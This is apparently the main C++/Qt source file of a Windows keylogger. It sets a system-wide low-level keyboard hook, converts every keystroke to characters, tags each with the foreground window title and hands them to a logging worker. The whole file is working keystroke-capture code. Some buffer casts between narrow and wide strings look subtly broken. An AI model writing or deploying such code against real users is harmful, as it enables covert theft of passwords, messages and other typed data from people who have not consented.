#include <QtCore/QCoreApplication>
#include <QApplication>
#include <QSystemTrayIcon>
#include <QDebug>
#include <QTime>
#include <QString>
#include <QChar>
#include <Windows.h>
#include <iostream>
#include "loggerworker.h"
#pragma comment(lib, "user32.lib")

HHOOK hHook = NULL;
LoggerWorker* logger;

// Store latest window
QString cWindow;

using namespace std;

void UpdateKeyState(BYTE *keystate, int keycode)
{
    keystate[keycode] = GetKeyState(keycode);
}

LRESULT CALLBACK MyLowLevelKeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    //WPARAM is WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP
    //LPARAM is the key information

    //Get the key information
    KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);

    wchar_t buffer[5];

    //get the keyboard state
    BYTE keyboard_state[256];
    GetKeyboardState(keyboard_state);
    UpdateKeyState(keyboard_state, VK_SHIFT);
    UpdateKeyState(keyboard_state, VK_CAPITAL);
    UpdateKeyState(keyboard_state, VK_CONTROL);
    UpdateKeyState(keyboard_state, VK_MENU);

    //Get keyboard layout
    HKL keyboard_layout = GetKeyboardLayout(0);

    //Get the name
    char lpszName[0x100] = {0};

    DWORD dwMsg = 1;
    dwMsg += cKey.scanCode << 16;
    dwMsg += cKey.flags << 24;

    int i = GetKeyNameText(dwMsg, (LPTSTR)lpszName,255);

    //Try to convert the key info
    int result = ToUnicodeEx(cKey.vkCode, cKey.scanCode, keyboard_state, buffer,4,0, keyboard_layout);
    buffer[4] = L'\0';

    // Get key status(pressed or released)
    bool pressed = false;
    QString keyStatus;
    keyStatus.clear();
    if(wParam == WM_KEYDOWN)
    {
        keyStatus = " PRESSED";
        pressed = true;
    }else if(wParam == WM_KEYUP){
        keyStatus = " Released";
        pressed = false;
    }

    // Get current Top window
    HWND windowH = GetForegroundWindow();
    if(windowH)
    {
        char windowName[100];
        GetWindowText(windowH, (LPWSTR)windowName, 100);
        QString newWindow = QString::fromUtf16((ushort*)windowName);
        if(cWindow != newWindow)
        {
            qDebug() << "CurrentWindow -- " << newWindow;
            cWindow = newWindow;
        }
    }
    //Handle data
    QString currChar = QString::fromUtf16((ushort*)buffer);
    if(logger)
    {
        logger->storeCharData(pressed, currChar, cWindow);
    }else{
        qDebug() << "key: " << cKey.vkCode << " " << currChar << " " << QString::fromUtf16((ushort*)lpszName)
                    << " - " << keyStatus;
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);

    // Initialize global var
    logger = new LoggerWorker();
    cWindow.clear();

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, MyLowLevelKeyBoardProc, NULL, 0);
    if(hHook == NULL)
    {
        qDebug() << "Hook failed";
    }

    // Tray Icon
#ifndef QT_NO_SYSTEMTRAYICON
    if(QSystemTrayIcon::isSystemTrayAvailable())
    {
        qDebug() << "SystemTray Available";
    }
#else

#endif

    return a.exec();
}
